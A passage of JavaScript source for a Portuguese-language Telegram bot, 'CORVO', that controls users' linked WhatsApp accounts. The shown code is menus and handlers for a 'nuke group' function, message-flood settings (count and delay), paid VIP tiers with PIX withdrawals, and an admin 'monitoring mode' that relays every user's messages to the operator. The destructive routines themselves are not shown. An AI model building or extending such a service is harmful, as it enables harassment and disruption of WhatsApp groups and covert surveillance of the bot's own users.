        await cleanupAfterReply(ctx, tid, msg?.message_id);
    } catch (e) {
        const msg = await ctx.reply(`❌ • Erro ao buscar grupos: ${e.message}`).catch(() => { });
        await cleanupAfterReply(ctx, tid, msg?.message_id);
    }
});


bot.hears('💣 • NUKAR GRUPO • 💣', async (ctx) => {
    const tid = ctx.from.id;
    const sock = userSessions[tid];
    if (!sock?.user) return ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });

    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);
        if (groups.length === 0) return ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });

        const buttons = safeGroupButtons(groups, 'nukar', 0, tid);
        if (buttons.length === 0) return ctx.reply('❌ • Nenhum grupo com nome válido encontrado para exibir.').catch(() => { });

        ctx.reply('⚠️ • *Selecione o grupo para NUKAR:*', {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }).catch(() => { });
    } catch (e) {
        console.error('Erro ao buscar grupos:', e);
        ctx.reply(`❌ • Erro ao buscar grupos: ${e.message}`).catch(() => { });
    }
});

bot.hears('ℹ️ • Info Grupo', async (ctx) => {
    const tid = ctx.from.id;
    const sock = userSessions[tid];
    if (!sock?.user) return ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });

    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);
        if (groups.length === 0) return ctx.reply('❌ • Nenhum grupo encontrado.').catch(() => { });

        const buttons = safeGroupButtons(groups, 'info', 0, tid);
        ctx.reply('ℹ️ • *Selecione o grupo para ver informações detalhadas:*', {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }).catch(() => { });
    } catch (e) { ctx.reply('❌ • Erro ao obter lista de grupos.').catch(() => { }); }
});

bot.hears('📋 • Listar Grupos', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sock = userSessions[tid];

    if (!sock?.user) {
        const errMsg = await ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });
        if (errMsg?.message_id) {
            trackBotMessage(tid, errMsg.message_id);
            setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, errMsg.message_id).catch(() => { }), 5000);
        }
        return;
    }

    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);

        if (groups.length === 0) {
            const errMsg = await ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });
            if (errMsg?.message_id) {
                trackBotMessage(tid, errMsg.message_id);
                setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, errMsg.message_id).catch(() => { }), 5000);
            }
            return;
        }

        let lista = `📋 • *SEUS GRUPOS (${groups.length})*\n\n`;

        // Mostrar grupos com nome REAL (subject)
        groups.forEach((g, i) => {
            const nomeGrupo = g.subject || g.name || 'Grupo sem nome';
            const membros = g.participants?.length || '?';
            lista += `*${i + 1}.* ${nomeGrupo}\n`;
            lista += `   👥 Membros: ${membros}\n`;
            lista += `   🆔 \`${g.id}\`\n\n`;
        });

        // Se a mensagem for muito longa, divide
        if (lista.length > 4000) {
            const partes = lista.match(/[\s\S]{1,4000}/g) || [lista];
            for (const parte of partes) {
                const sentMsg = await ctx.reply(parte, { parse_mode: 'Markdown' }).catch(() => { });
                if (sentMsg?.message_id) {
                    trackBotMessage(tid, sentMsg.message_id);
                    setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
                }
            }
        } else {
            const sentMsg = await ctx.reply(lista, { parse_mode: 'Markdown' }).catch(() => { });
            if (sentMsg?.message_id) {
                trackBotMessage(tid, sentMsg.message_id);
                setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
            }
        }
    } catch (e) {
        logEvent('ERROR', `Erro ao listar grupos: ${e.message}`);
        const errMsg = await ctx.reply('❌ • Erro ao listar grupos.').catch(() => { });
        if (errMsg?.message_id) {
            trackBotMessage(tid, errMsg.message_id);
            setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, errMsg.message_id).catch(() => { }), 5000);
        }
    }
});

bot.hears('⚡ • Health Check', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);

    const start = Date.now();
    let apiStatus = '🔴 OFFLINE';
    try {
        await axios.get('https://api-momoayse.aliancakkgr.com.br/api/url/rastrear/criar', {
            params: { url: 'test', apikey: 'test' }
        }).catch(e => e.response);
        apiStatus = '🟢 ONLINE';
    } catch (e) { }

    const ping = Date.now() - start;
    const waStatus = userSessions[tid]?.user ? '🟢 CONECTADO' : '🔴 DESCONECTADO';

    const info = `🏥 • *HEALTH CHECK CORVO*\n\n` +
        `📡 *API Momo:* \`${apiStatus}\`\n` +
        `📱 *WhatsApp:* \`${waStatus}\`\n` +
        `⏱️ *Latência:* \`${ping}ms\`\n` +
        `🖥️ *Memória RAM:* \`${(process.memoryUsage().rss / 1024 / 1024).toFixed(1)} MB\`\n` +
        `⏳ *Uptime:* \`${Math.floor(process.uptime() / 60)} minutos\``;

    const sentMsg = await ctx.reply(info, { parse_mode: 'Markdown' }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('⚡ • Status Sistema', async (ctx) => {
    const start = Date.now();
    const msg = await ctx.reply('⚡ • *Calculando latência de resposta...*', { parse_mode: 'Markdown' }).catch(() => { });
    if (!msg) return;
    const ping = Date.now() - start;
    ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `⚡ • *PONG!*\n\n⏱️ • *Latência:* \`${ping}ms\`\n📡 • *Status do Servidor:* \`Excelente\``, { parse_mode: 'Markdown' }).catch(() => { });
});


bot.hears('💰 • Saldo Bancário', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const res = await promisseApi.getBalance();
    if (res) {
        ctx.reply(`💰 *SALDO PROMISSE*\n\n• Saldo Disponível: *R$ ${(res.balance / 100).toFixed(2)}*\n• Saldo Pendente: *R$ ${(res.pending_balance / 100).toFixed(2)}*`, { parse_mode: 'Markdown' });
    } else {
        ctx.reply('❌ Erro ao consultar saldo.');
    }
});

bot.hears('💸 • Solicitar Saque', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    userStates[ctx.from.id] = 'wait_withdraw_info';
    ctx.reply('💸 *SOLICITAR SAQUE*\n\nEnvie os dados no formato: `VALOR|CHAVE_PIX`\nExemplo: `50.00|seu@email.com`', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('💎 • Gerenciar VIPs', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    userStates[ctx.from.id] = 'wait_add_vip';
    const sentMsg = await ctx.reply('💎 *ADICIONAR VIP MANUAL*\n\nEnvie o ID do usuário que deseja tornar VIP.', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
});

bot.hears('🎁 • VIP para Todos', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    userStates[ctx.from.id] = 'wait_vip_all';
    const sentMsg = await ctx.reply('🎁 • *DAR VIP PARA TODOS*\n\n📝 Envie o número de DIAS de VIP que deseja dar para TODOS os usuários do bot.\n\n*Exemplo:* `1` (para 1 dia)\n\n⚠️ *Atenção:* Isso dará VIP para TODOS os usuários cadastrados!', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
});


bot.hears('🔄 • Reiniciar Bot', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    await ctx.reply('🔄 • *REINICIANDO SISTEMA...*\n\nO bot ficará offline por alguns segundos e voltará automaticamente.', { parse_mode: 'Markdown' });
    logEvent('WARN', 'Bot reiniciado pelo administrador.');
    process.exit(1); // Assume process manager like PM2 will restart it
});

bot.hears('🎁 • VIP Global (7 Dias)', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    const users = Object.keys(usersData);
    let count = 0;
    const duration = 7 * 24 * 60 * 60 * 1000;
    users.forEach(id => {
        const tid = parseInt(id);
        if (!vips[tid]) vips[tid] = { type: 'VIP', expiresAt: Date.now() + duration };
        else vips[tid].expiresAt = Math.max(vips[tid].expiresAt, Date.now()) + duration;
        count++;
    });
    saveVips();
    ctx.reply(`🎁 • *SUCESSO!*\n\nVocê deu 7 dias de VIP para todos os *${count}* usuários cadastrados!`, { parse_mode: 'Markdown' });
});

bot.hears('🧹 • Limpar Logs', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    fs.writeFileSync('./logs.txt', '');
    ctx.reply('<blockquote>🧹 <b>LOGS LIMPOS COM SUCESSO!</b></blockquote>', { parse_mode: 'HTML' });
});

bot.hears('📊 • Estatísticas Full', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const totalMsg = globalStats.messagesSent;
    const totalGroups = globalStats.rajarGroups;
    const totalUsersCount = Object.keys(usersData).length;
    const totalVips = Object.keys(vips).length;

    const msg = `<blockquote>📊 <b>ESTATÍSTICAS COMPLETAS CORVO</b>\n\n` +
        `✉️ <b>Total Mensagens:</b> <code>${totalMsg}</code>\n` +
        `🎯 <b>Total Grupos:</b> <code>${totalGroups}</code>\n` +
        `👥 <b>Total Usuários:</b> <code>${totalUsersCount}</code>\n` +
        `💎 <b>Total VIPs:</b> <code>${totalVips}</code>\n\n` +
        `⚡ <i>Corvo Intelligence System</i></blockquote>`;
    ctx.reply(msg, { parse_mode: 'HTML' });
});

bot.hears('👑 • PAINEL ADMINISTRATIVO', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    const sentMsg = await ctx.reply('👑 • *PAINEL ADMINISTRATIVO CORVO:*', { parse_mode: 'Markdown', ...getAdminMenu() }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
});

bot.hears('👥 • Lista de Usuários', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;

    // Apaga mensagem do usuário
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);

    const usersArray = Array.from(totalUsers);
    const bannedArray = Array.from(bannedUsers);

    let msg = `👥 • *LISTA DE USUÁRIOS*\n\n`;
    msg += `📊 *TOTAL NO BANCO:* \`${usersArray.length}\`\n`;
    msg += `🚫 *BANIDOS:* \`${bannedArray.length}\`\n\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;

    // Mostrar até 15 usuários com detalhes - priorizando os que tem dados completos
    const maxShow = Math.min(usersArray.length, 15);

    // Ordenar: usuários com dados completos primeiro
    const sortedUsers = [...usersArray].sort((a, b) => {
        const aHasData = usersData[a] && usersData[a].name && usersData[a].name !== 'Desconhecido';
        const bHasData = usersData[b] && usersData[b].name && usersData[b].name !== 'Desconhecido';
        if (aHasData && !bHasData) return -1;
        if (!aHasData && bHasData) return 1;
        // Secundário: ordenar por lastSeen (mais recente primeiro)
        const aLastSeen = usersData[a]?.lastSeen || 0;
        const bLastSeen = usersData[b]?.lastSeen || 0;
        return bLastSeen - aLastSeen;
    });

    for (let i = 0; i < maxShow; i++) {
        const uid = sortedUsers[i];
        const vipData = vips[uid];
        const userData = usersData[uid] || {};
        const isBanned = bannedUsers.has(uid);

        let status = '🆓 FREE';
        let diasVip = '-';

        if (uid === ADMIN_ID) {
            status = '👑 ADMIN';
        } else if (vipData && Date.now() < vipData.expiresAt) {
            const diasRestantes = Math.ceil((vipData.expiresAt - Date.now()) / (24 * 60 * 60 * 1000));
            status = vipData.type === 'trial' ? '🎁 TRIAL' : '💎 VIP';
            diasVip = `${diasRestantes} dias`;
        }

        if (isBanned) status = '🚫 BANIDO';

        // Usar dados do Telegram se disponíveis, senão mostrar indicador claro
        const userName = (userData.name && userData.name !== 'Desconhecido') ? userData.name : '⚠️ Aguardando';
        const userPhone = (userData.phone && userData.phone !== 'N/A') ? userData.phone : '—';
        const userUsername = userData.username ? `@${userData.username}` : '—';

        msg += `*${i + 1}.* 🆔 \`${uid}\`\n`;
        msg += `   👤 ${userName}`;
        if (userData.username) msg += ` (${userUsername})`;
        msg += `\n`;
        msg += `   📱 ${userPhone} | ${status}`;
        if (diasVip !== '-') msg += ` (${diasVip})`;
        msg += `\n\n`;
    }

    if (usersArray.length > 15) {
        msg += `\n_... e mais ${usersArray.length - 15} usuários_`;
    }

    msg += `\n\n💡 *Dica:* Use os botões para gerenciar VIP`;

    const buttons = Markup.inlineKeyboard([
        [Markup.button.callback('💎 Dar VIP', 'admin_give_vip'), Markup.button.callback('🗑️ Tirar VIP', 'admin_remove_vip')],
        [Markup.button.callback('📢 Enviar MSG p/ Todos', 'admin_broadcast_all')],
        [Markup.button.callback('🔙 Voltar', 'admin_panel')]
    ]);

    const sentMsg = await ctx.reply(msg, { parse_mode: 'Markdown', ...buttons }).catch(() => { });
    // Apaga após 60s
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
});

bot.hears('🚫 • Banir Usuário', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    userStates[ctx.from.id] = 'wait_ban';
    const sentMsg = await ctx.reply('🚫 • *Envie o ID do usuário que deseja BANIR:*', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
});

bot.hears('💎 • Dar VIP por ID', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    userStates[ctx.from.id] = 'wait_give_vip';
    const sentMsg = await ctx.reply('💎 • *DAR VIP MANUALMENTE*\n\n📝 Envie no formato:\n`ID DIAS`\n\n*Exemplo:*\n`123456789 30`\n\nIsso dará 30 dias de VIP para o usuário com ID 123456789', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
});

bot.hears('📢 • Broadcast Global', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    userStates[ctx.from.id] = 'wait_broadcast';
    const sentMsg = await ctx.reply('📢 • *Envie a mensagem de transmissão para todos os usuários:*', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
});

bot.hears('📝 • Postar Changelog', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    userStates[ctx.from.id] = 'wait_changelog';
    const sentMsg = await ctx.reply('📝 • *POSTAR CHANGELOG*\n\nEnvie o texto exato do Changelog. Ele será postado no canal do Telegram e nos canais do WhatsApp configurados.', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
});

bot.hears('⚙️ • CONFIGURAÇÕES', async (ctx) => {
    const tid = ctx.from.id;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    const sentMsg = await ctx.reply('⚙️ • *Painel de Configurações do Bot:*', { parse_mode: 'Markdown', ...getConfigMenu(tid) }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
});


bot.hears('🔢 • Alterar Quantidade', (ctx) => {
    userStates[ctx.from.id] = 'wait_qty';
    ctx.reply('🔢 • *Informe a quantidade de mensagens (1-100):*', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears('⏳ • Alterar Delay', (ctx) => {
    userStates[ctx.from.id] = 'wait_delay';
    ctx.reply('⏳ • *Informe o delay entre mensagens (em milissegundos):*', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears('🔙 • Voltar', async (ctx) => {
    const tid = ctx.from.id;

    // Rastreia a mensagem do botão Voltar
    if (ctx.message?.message_id) {
        trackUserMessage(tid, ctx.message.message_id);
    }

    // Limpa estados
    delete userStates[tid];

    // Envia menu principal e limpa mensagens antigas
    await sendMainMenuProfile(ctx, tid); // FIX Bug #1: sentMsg não existe aqui, cleanupAfterReply já é chamado dentro de sendMainMenuProfile
});

bot.hears(['ℹ️ • Sobre o Bot • CORVO', 'ℹ️ • Sobre o Bot'], async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const aboutMsg = `ℹ️ • *SOBRE O BOT • CORVO*\n\n` +
        `O *CORVO DIV* é o bot mais completo\n\n` +
        `Escolha uma das opções abaixo para saber mais sobre o sistema, obter suporte ou conhecer nossos parceiros oficiais.`;
    const sentMsg = await ctx.reply(aboutMsg, { parse_mode: 'Markdown', ...getAboutMenu() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('📢 • Canal Parceiros', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const partnersMsg = `📢 • *CANAIS PARCEIROS CORVO BOT*\n\n` +
        `Conheça os canais que fortalecem a nossa comunidade. Conteúdo de qualidade e atualizações constantes!\n\n` +
        `> ⚠️ *Aviso:* Ao usar o Corvo, você apoia nossos parceiros.`;
    const sentMsg1 = await ctx.reply(partnersMsg, { parse_mode: 'Markdown', ...getPartnersInline() }).catch(() => { });
    const sentMsg2 = await ctx.reply('Deseja ver como se tornar um parceiro?', getPartnersMenu()).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg2?.message_id);
});

bot.hears('🤝 • Ser um Parceiro', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const recruitMsg = `🤝 • *QUER SER UM PARCEIRO DO CORVO BOT?*\n\n` +
        `Estamos sempre em busca de novos canais para crescer junto conosco! 🚀\n\n` +
        `📋 *REQUISITOS MÍNIMOS:*\n` +
        `• Ter acima de *500 seguidores*.\n` +
        `• *Não* ter seguidores comprados.\n` +
        `• Enviar *provas* de que os seguidores são reais.\n\n` +
        `🎁 *BENEFÍCIOS:*\n` +
        `• Quem usar o CORVO BOT será incentivado a seguir o seu canal!\n\n` +
        `📩 *CONTATO:* [@CORVO291](https://t.me/CORVO291)\n` +
        `_Chama lá e apresente seu canal!_`;
    const sentMsg = await ctx.reply(recruitMsg, { parse_mode: 'Markdown', disable_web_page_preview: true }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('📊 • Status', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const isConnected = !!userSessions[tid]?.user;
    const config = loadUserConfig(tid);
    const session = hasSession(tid);
    const activeConns = Object.keys(userSessions).filter(k => !!userSessions[k]?.user).length;

    let status = `📊 • *ESTATÍSTICAS ULTIMATE*\n\n`;
    status += `📱 • *Seu WhatsApp:* ${isConnected ? '🟢 Online' : '🔴 Offline'}\n`;
    status += `💾 • *Sessão:* ${session ? '✅ Salva' : '❌ Vazia'}\n\n`;
    status += `📈 • *ESTATÍSTICAS GLOBAIS:*\n`;
    status += `👥 • *Total de Usuários:* \`${totalUsers.size}\`\n`;
    status += `🔌 • *Conexões Ativas:* \`${activeConns}\`\n\n`;
    status += `⚙️ • *CONFIGURAÇÃO ATUAL:* \n`;
    status += `📝 Texto: \`${config.texto}\` \n🔢 Qtd: \`${config.quantidade}\` \n⏳ Delay: \`${config.delay}ms\``;

    if (connectionTimers[tid]) {
        const elapsed = Date.now() - connectionTimers[tid].startTime;
        const remaining = Math.max(0, THREE_HOURS - elapsed);
        const hours = Math.floor(remaining / (1000 * 60 * 60));
        const mins = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        status += `\n\n⏰ • *Sessão expira em:* ${hours}h ${mins}m`;
    }

    const sentMsg = await ctx.reply(status, { parse_mode: 'Markdown' }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('🧹 • Limpar Sessão', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sessionDir = `./sessions/${tid}`;
    if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
        delete userSessions[tid];
        stopTimer(tid);
        logEvent('INFO', `Sessão limpa pelo usuário ${tid}`);
        const sentMsg = await ctx.reply('🧹 • *Sessão limpa com sucesso!* Seus dados foram removidos.', { parse_mode: 'Markdown', ...getMainMenu(tid) }).catch(() => { });
        await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
    } else {
        const sentMsg = await ctx.reply('❌ • Nenhuma sessão ativa encontrada para limpar.', getMainMenu(tid)).catch(() => { });
        await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
    }
});

bot.hears('🆘 • SUPORTE', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sentMsg = await ctx.reply('🆘 • *CENTRAL DE SUPORTE CORVO*\n\nSelecione uma opção abaixo para nos ajudar a melhorar o bot:', { parse_mode: 'Markdown', ...getSupportMenu() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('📊 • Status Monitor', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const status = monitoringMode ? '🟢 ATIVO' : '🔴 DESATIVADO';
    const ram = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);

    const msg = `<blockquote>📊 <b>STATUS DO MONITORAMENTO</b>\n\n` +
        `⚙️ <b>Modo:</b> <code>${status}</code>\n` +
        `🧠 <b>RAM:</b> <code>${ram} MB</code>\n` +
        `⏱️ <b>Uptime:</b> <code>${hours}h ${minutes}m</code>\n` +
        `✉️ <b>Cache:</b> <code>${messageHistory.length} msgs</code>\n\n` +
        `🕹️ <b>Controles:</b>\n` +
        `🟢 Ativar Monitor - Iniciar\n` +
        `🔴 Desativar Monitor - Parar\n` +
        `📨 Últimas Mensagens - Ver Log\n\n` +
        `⚡ <i>Corvo Intelligence System</i></blockquote>`;

    ctx.reply(msg, { parse_mode: 'HTML' });
});

bot.hears('💡 • Enviar Sugestão', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    userStates[tid] = 'wait_suggestion';
    const sentMsg = await ctx.reply('💡 • *ENVIAR SUGESTÃO*\n\nEscreva abaixo sua sugestão para o bot. Sua mensagem será enviada diretamente para a equipe de desenvolvimento.', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('🐛 • Relatar Bug', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    userStates[tid] = 'wait_bug';
    const sentMsg = await ctx.reply('🐛 • *RELATAR BUG*\n\nDescreva detalhadamente o erro ou bug que você encontrou. Se possível, informe o que você estava fazendo quando o erro ocorreu.', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('👨‍💻 • Contato Admin', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sentMsg = await ctx.reply('👨‍💻 • *CONTATO ADMINISTRATIVO*\n\nClique no link abaixo para falar com o suporte oficial:', {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.url('Falar com Admin', OFFICIAL_SITES.admin)]])
    }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('📩 • Ver Feedbacks', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);

    if (supportFeedbacks.length === 0) {
        const sentMsg = await ctx.reply('📩 • Ninguém enviou sugestões ou bugs ainda.', { ...getAdminMenu() }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 15000);
        return;
    }

    let msg = `📩 • *LISTA DE FEEDBACKS (${supportFeedbacks.length})*\n\n`;
    supportFeedbacks.slice(-10).forEach((f, i) => {
        msg += `📌 *${f.type.toUpperCase()}* - ${f.date}\n👤 User: \`${f.user}\`\n💬: ${f.text}\n\n`;
    });

    const sentMsg = await ctx.reply(msg, { parse_mode: 'Markdown', ...getAdminMenu() }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 30000);
});

// --- COMANDOS DE MONITORAMENTO (ADMIN) ---
bot.command('monitor_on', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    monitoringMode = true;
    ctx.reply('✅ • *MODO MONITORAMENTO ATIVADO*\n\nVocê receberá TODAS as mensagens dos usuários em tempo real!', { parse_mode: 'Markdown' });
});

bot.command('monitor_off', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    monitoringMode = false;
    for (const msgId of monitorMessageIds) {
        bot.telegram.deleteMessage(ADMIN_ID, msgId).catch(() => { });
    }
    monitorMessageIds = []; // Limpa array
    ctx.reply('❌ • *MODO MONITORAMENTO DESATIVADO*\n\nAs mensagens foram apagadas da tela e você não receberá mais logs.', { parse_mode: 'Markdown' });
});

bot.command('ultimas_mensagens', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    if (messageHistory.length === 0) {
        return ctx.reply('📭 • Nenhuma mensagem registrada ainda.');
    }

    const limit = 20; // Últimas 20 mensagens
    const recent = messageHistory.slice(-limit);

    let msg = `📊 *ÚLTIMAS ${recent.length} MENSAGENS*\n\n`;
    recent.forEach((m, i) => {
        msg += `${i + 1}. 👤 *${m.firstName}* (@${m.username})\n`;
        msg += `   🆔 \`${m.tid}\`\n`;
        msg += `   💬 ${m.messageText}\n`;
        msg += `   ⏰ ${m.timestamp}\n\n`;
    });

    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('status_monitor', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const status = monitoringMode ? '🟢 ATIVO' : '🔴 DESATIVADO';
    const totalMsg = messageHistory.length;
    ctx.reply(
        `📊 *STATUS DO MONITORAMENTO*\n\n` +
        `🎯 Modo: ${status}\n` +
        `📨 Mensagens registradas: ${totalMsg}\n` +
        `👥 Usuários ativos: ${totalUsers.size}\n\n` +
        `*Comandos disponíveis:*\n` +
        `• \`/monitor_on\` - Ativar monitoramento\n` +
        `• \`/monitor_off\` - Desativar monitoramento\n` +
        `• \`/ultimas_mensagens\` - Ver últimas 20 mensagens\n` +
        `• \`/status_monitor\` - Ver este status`,
        { parse_mode: 'Markdown' }
    );
});

// --- BOTÕES DE MONITORAMENTO (PAINEL ADMIN) ---
bot.hears('🟢 • Ativar Monitor', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    monitoringMode = true;
    const sentMsg = await ctx.reply('✅ • *MODO MONITORAMENTO ATIVADO*\n\nVocê receberá TODAS as mensagens dos usuários em tempo real!', {
        parse_mode: 'Markdown',
        ...getAdminMenu()
    }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 10000);
});

bot.hears('🔴 • Desativar Monitor', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    monitoringMode = false;
    for (const msgId of monitorMessageIds) {
        bot.telegram.deleteMessage(ADMIN_ID, msgId).catch(() => { });
    }
    monitorMessageIds = []; // Limpa array
    const sentMsg = await ctx.reply('❌ • *MODO MONITORAMENTO DESATIVADO*\n\nAs mensagens foram apagadas da tela e você não receberá mais logs.', {
        parse_mode: 'Markdown',
        ...getAdminMenu()
    }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 10000);
});

bot.hears('📨 • Últimas Mensagens', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);

    if (messageHistory.length === 0) {
        const sentMsg = await ctx.reply('📭 • Nenhuma mensagem registrada ainda.', { ...getAdminMenu() }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 10000);
        return;
    }

    const limit = 20;
